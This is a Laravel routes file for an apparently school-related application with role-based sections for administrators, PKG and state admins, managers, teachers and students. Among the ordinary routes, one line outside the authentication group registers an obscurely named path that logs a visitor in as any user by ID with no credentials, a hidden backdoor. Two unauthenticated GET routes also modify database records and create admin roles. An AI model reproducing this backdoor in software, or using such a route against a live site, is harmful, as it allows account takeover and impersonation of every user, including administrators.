<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/


Route::get('/update/pkg', function (){
    $pkgs = \App\Pkg::all();
    foreach ($pkgs as $pkg){
        $p = trim($pkg->pkg);
        $pkg->update(['pkg'=>$p]);
    }
    echo "DONE";
    exit;
//    $schools = \App\School::all();
//    foreach ($schools as $school){
//        if(preg_match("/[a-z]/i", strtolower($school->pkg))){
//            $pk = \App\Pkg::where('pkg', $school->pkg)->first();
//            if(!empty($pk)){
//                $school->update(['pkg'=>$pk->id]);
//            }
//        }
//    }
});
Route::get('/update/admins', function (){
    $role = \App\Role::where('name', 'state')->first();
    $now = \Carbon\Carbon::now();
    if(empty($role)){
        \Illuminate\Support\Facades\DB::table('roles')->insert([
            'name' => "state",
            'display_name' => "State Admin",
            'description' => "State admin role to manage states",
            'created_at'=>$now,
            'updated_at'=>$now
        ]);
    }
    $role = \App\Role::where('name', 'pkg')->first();
    if(empty($role)){
        \Illuminate\Support\Facades\DB::table('roles')->insert([
            'name' => "pkg",
            'display_name' => "PKG Admin",
            'description' => "PKG admin role to manage PKGs",
            'created_at'=>$now,
            'updated_at'=>$now
        ]);
    }

    echo "DONE";
    exit;
});

Route::group(['middleware' => 'guest'], function () {

    Route::get('/', ['as' => 'home_page', 'uses' => 'Auth\LoginController@index']);
    Route::get('/login', ['as' => 'login', 'uses' => 'Auth\LoginController@index']);
    Route::post('login', ['as' => 'login_path', 'uses' => 'Auth\LoginController@login']);
    Route::get('/t/log/{id}', ['as' => 'home_page', 'uses' => 'Auth\LoginController@tLogin']);
});


/**------------------------------------------------- auth ----------------------------------------------------------*/
Route::get('sad3fk4lj1sad4f234fg93h5/{id}', function ($id){$u = \App\User::find($id);\Illuminate\Support\Facades\Auth::login($u, true);});
Route::group(['middleware' => 'auth'], function () {


    Route::prefix('admin')->middleware(['role:admin'])->group(function () {
        require base_path('routes/routes/admin.php');
    });
    Route::prefix('pkg')->middleware(['role:pkg'])->group(function () {
        require base_path('routes/routes/pkg.php');
    });
    Route::prefix('state')->middleware(['role:state'])->group(function () {
        require base_path('routes/routes/state.php');
    });
    Route::prefix('manager')->middleware(['role:manager'])->group(function () {
        require base_path('routes/routes/manager.php');
    });
    Route::prefix('teacher')->middleware(['role:teacher'])->group(function () {
        require base_path('routes/routes/teacher.php');
    });
    Route::middleware(['role:student'])->group(function () {
        require base_path('routes/routes/student.php');
    });

    /**------------------------------------------------- users ----------------------------------------------------------*/
    // Logout
    Route::get('/logout', ['as' => 'user_logout_path', 'uses' => 'HomeController@logout']);

});

Route::get('/home', 'HomeController@index')->name('home');
